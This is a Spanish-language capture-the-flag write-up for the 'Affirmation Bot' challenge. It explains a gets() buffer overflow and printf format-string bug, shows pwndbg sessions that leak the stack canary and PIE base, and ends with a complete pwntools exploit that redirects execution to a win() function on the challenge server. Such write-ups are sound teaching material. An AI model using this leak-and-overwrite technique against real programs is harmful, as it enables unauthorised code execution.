# Affirmation Bot

En este ejercicio nos dan un binario y su código fuente.

```c
checksec
File:     /home/ub1cu0/Desktop/wwctf/affirmation_bot/affirmationbot
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

Vamos a ejecutar el programa:

```c
./affirmationbot
Tell me whats on your mind...
> hola
You said: hola
Affirmation Bot says: Spot on!
> adios
You said: adios
Affirmation Bot says: That's the best idea I've heard all day!
```

Como podemos ver parece que estamos en un bucle en donde nos devuelven nuestro input junto con un mensaje motivador. Vamos a comprobarlo en el código:

```c
while(1) {
    affirm();
}
```

```c
void affirm() {
    uint8_t buffer[128] = {0};
    printf("> ");
    gets(buffer);
    printf("You said: ");
    printf(buffer);
    printf("\nAffirmation Bot says: ");
    int index = rand() % 11;
    printf("%s\n", affirmations[index]);
    fflush(stdout);
}
```

La función affirm se ejecuta en bucle. Podemos ver también un `gets` sin especificar tamaño y un `printf` sin especificar el tipo de dato con lo cual tenemos un buffer overflow y un format strings. También hay una función win:

```c
void win() {
    uint8_t flag_buffer[128] = {0};
    int fd = open("flag.txt", O_RDONLY);
    read(fd, flag_buffer, sizeof(flag_buffer));
    puts(flag_buffer);
    close(fd);
}
```

Como tenemos `PIE` y `Canary` activados tenemos que hacer lo siguiente:

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Para hacer un leak del canary podemos mandar muchas `%p` para que nos vaya devolviendo el contenido del stack en forma de punteros y intentar encontrar el valor del canary. El canary siempre acaba por `00` para que el programa sepa donde tiene que acabar de leer el canary. Yo ya he hecho un fuzzing de muchas posiciones y he encontrado el siguiente valor:

```c
> %47$p // Posición 47
You said: 0xf2acbd7b61d92e00
```

Tiene buena pinta, pero como lo comprobamos? Podemos usar `telescope` para verlo, el canary suele estar después del rbp:

```c
pwndbg> telescope $rsp 30  // Mostramos los 30 siguientes elementos antes del rsp
00:0000│ rsp 0x7fffffffdbd0 ◂— 1
01:0008│-098 0x7fffffffdbd8 ◂— 0x6f7e388d2
02:0010│-090 0x7fffffffdbe0 ◂— 0x7024373425
03:0018│-088 0x7fffffffdbe8 ◂— 0
... ↓        15 skipped
13:0098│-008 0x7fffffffdc68 ◂— 0xf2acbd7b61d92e00 // Aquí!
14:00a0│ rbp 0x7fffffffdc70 —▸ 0x7fffffffdc80 ◂— 1
```

Es el mismo! Ya sabemos que ese es el valor del canary. Ahora tenemos que hacer un leak del `PIE`. Para descubrir la dirección base del binario tenemos que primero hacer un leak de una instrucción del programa, descubrir su offset con respecto a la base del binario, y una vez sabemos el offset podemos ya calcularlo en nuestro solver final.

```c
Offset = Dirección del binario leakeada - Piebase
```

Con `piebase` podemos sacar la dirección del binario en local. Ahora podemos fuzzear con muchos `%p` para intentar encontrar una, yo he encontrado esta:

```c
pwndbg> x 0x55555555547c 
0x55555555547c <main>: 0x59058b48e5894855
```

```c
pwndbg> piebase
Calculated VA from /home/ub1cu0/Desktop/wwctf/affirmation_bot/affirmationbot = 0x555555554000
pwndbg> x 0x55555555547c - 0x555555554000
0x147c:	Cannot access memory at address 0x147c // Este es el offset
```

Ahora que tenemos todo lo necesario podemos montar el solver:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./affirmationbot_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b affirm
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("chal.wwctf.com", 4001)

def main():
    io = conn()
    offset = 136  # Esto podemos sacarlo mirando el código y probando a ver si crashea o no
    padding = 8   # para saltar el RBP (queremos llegar a la dirección de retorno, la cual está después del rbp)
    io.sendlineafter(b'> ', '%47$p')  # Leak del Canary
    linea = io.recvline().strip().decode()
    canary = int(linea.split("0x")[1], 16)
    log.success(f'Canary: {hex(canary)}')
    io.sendlineafter(b'> ', '%37$p') # Leak del PIE, en remoto puede variar, si no va probar posiciones cercanas al que va en local
    leaked_function_line = io.recvline().strip().decode()
    leaked_function = int(leaked_function_line.split("0x")[1], 16)
    
    exe.address = leaked_function - 0x147c
    log.success(f'Base Address: {hex(exe.address)}')
    
    payload = flat({
        offset: [
            canary,
            b'A' * padding,
            exe.symbols.win
        ]
    })

    io.sendlineafter(b'> ', payload)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

Gracias por leer.
